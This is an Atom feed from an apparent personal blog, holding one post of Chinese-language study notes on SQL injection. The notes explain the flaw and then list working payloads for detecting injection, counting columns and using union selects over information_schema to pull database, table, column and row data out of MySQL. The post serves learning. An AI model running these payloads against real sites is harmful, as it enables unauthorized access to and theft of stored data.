<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fl4g</title>
  
  
  <link href="//atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-29T12:02:09.795Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Fl4g_LL</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入--学习笔记</title>
    <link href="http://yoursite.com/2019/10/29/SQL%E6%B3%A8%E5%85%A5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/10/29/SQL注入-学习笔记/</id>
    <published>2019-10-29T10:39:36.000Z</published>
    <updated>2019-10-29T12:02:09.795Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>将SQL语句作为参数传给web应用程序，让服务器执行恶意的SQL命令，而不去执行原先设计好的数据库命令。<br>假设我们在浏览器中输入URL <a href="http://www.abc.com?id=1" target="_blank" rel="noopener">www.abc.com?id=1</a> 时，我们在URL中传递变量id，并且提供值为1，由于它是对数据库进行动态查询的请求（其中?id＝1表示数据库查询变量），所以我们可以该URL中嵌入恶意SQL语句。  </p><p>造成SQL注入漏洞原因有两个 ：</p><ul><li>没有对输入的数据进行过滤（过滤输入）</li><li>没有对发送到数据的数据进行转义（转义输出）  </li></ul><h1 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h1><ul><li><code>&#39;#</code> –&gt; 报错，返回数据库错误<br><img src="D:%5CBlog%5Chexo%5Cpublic%5Cimg%5C1.png" alt="图片"></li><li><code>&#39; or 1=1#</code> –&gt; 永真条件，返回所有记录</li><li><code>&#39; and 1=2#</code> –&gt; 永假条件，不返回记录  </li><li><code>&#39; or &#39;1&#39;=&#39;1</code></li><li><code>&#39;and &#39;1&#39;=&#39;2</code><br>（有时候单引号不行可以试试双引号）</li></ul><h1 id="利用-information-schema"><a href="#利用-information-schema" class="headerlink" title="利用 information_schema"></a>利用 information_schema</h1><p>information_schema 是 MySQL 中的一个默认数据库，里面存放了其他所有数据库的信息。</p><h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p><code>&#39; order by 1#</code> ， <code>&#39; order by 2#</code> 如果列数不存在的话会报错，可以用二分法查询。</p><h2 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><ul><li><code>&#39; union select 1, group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#</code></li><li><code>&#39; union select 1, database()#</code><h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><code>&#39; union select 1, group_concat(TABLE_NAME) from information_schema.TABLES where table_schema = &#39;你想要获取的表名&#39;#</code> <h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><code>&#39; union select 1, group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_name = &#39;表名&#39;#</code><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><code>&#39; union select 1, group_concat(你想要获取的列名) from 表名#</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;将SQL语句作为参数传给web应用程序，让服务器执行恶意的SQL命令，而不去执行原先设计好的数据库命令。&lt;br&gt;假设我们在浏览器中输入URL
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
